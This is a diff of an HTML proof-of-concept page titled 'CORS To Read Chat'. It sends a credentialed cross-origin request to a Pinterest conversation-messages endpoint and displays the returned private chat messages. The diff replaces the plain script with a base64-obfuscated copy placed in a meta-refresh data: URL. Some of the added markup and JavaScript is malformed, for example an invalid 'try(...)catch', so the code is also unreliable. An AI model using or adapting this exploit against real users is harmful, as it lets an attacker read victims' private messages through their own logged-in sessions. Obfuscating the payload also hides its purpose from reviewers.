@@ -1,23 +1,10 @@
 <html>
 <head>
-<title>HELLO</title>
+<html><head><meta charset="UTF-8"><script>try(window.opener = null;)catch(e){}</script><meta http-equiv="Refresh" content="0";URL=data:text/html;base64,PHNjcmlwdD4KZnVuY3Rpb24gY29ycygpIHsKICB2YXIgeGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKICB4aHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgIGlmICh0aGlzLnJlYWR5U3RhdGUgPT0gNCAmJiB0aGlzLnN0YXR1cyA9PSAyMDApIHsKICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRlbW8iKS5pbm5lckhUTUwgPSBkb2N1bWVudC53cml0ZSh0aGlzLnJlc3BvbnNlVGV4dCk7CiAgICB9CiAgfTsKICB4aHR0cC5vcGVuKCJHRVQiLCAiaHR0cHM6Ly9waW50ZXJlc3QuY29tL3Jlc291cmNlL0NvbnZlcnNhdGlvbk1lc3NhZ2VzUmVzb3VyY2UvZ2V0Lz9zb3VyY2VfdXJsPSUyRiZkYXRhPSU3QiUyMm9wdGlvbnMlMjIlM0ElN0IlMjJpc1ByZWZldGNoJTIyJTNBZmFsc2UlMkMlMjJwYWdlX3NpemUlMjIlM0EyNSUyQyUyMmNvbnZlcnNhdGlvbl9pZCUyMiUzQSUyMjUxMTAyNjY3OTE2MDU2MDg1OTMlMjIlN0QlMkMlMjJjb250ZXh0JTIyJTNBJTdCJTdEJTdEJl89MTU5OTIwMDkzNDY1MiIsIHRydWUpOwogIHhodHRwLndpdGhDcmVkZW50aWFscyA9IHRydWU7CiAgeGh0dHAuc2VuZCgpOwp9Cjwvc2NyaXB0Pg== />
 </head>
-<body onload = "cors()">
+<body>
 <h2>CORS To Read Chat</h2>
 <div id="demo">
 </div>
-<script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = document.write(this.responseText);
-    }
-  };
-  xhttp.open("GET", "https://pinterest.com/resource/ConversationMessagesResource/get/?source_url=%2F&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22page_size%22%3A25%2C%22conversation_id%22%3A%225110266791605608593%22%7D%2C%22context%22%3A%7B%7D%7D&_=1599200934652", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
-</script>
 </body>
 </html>
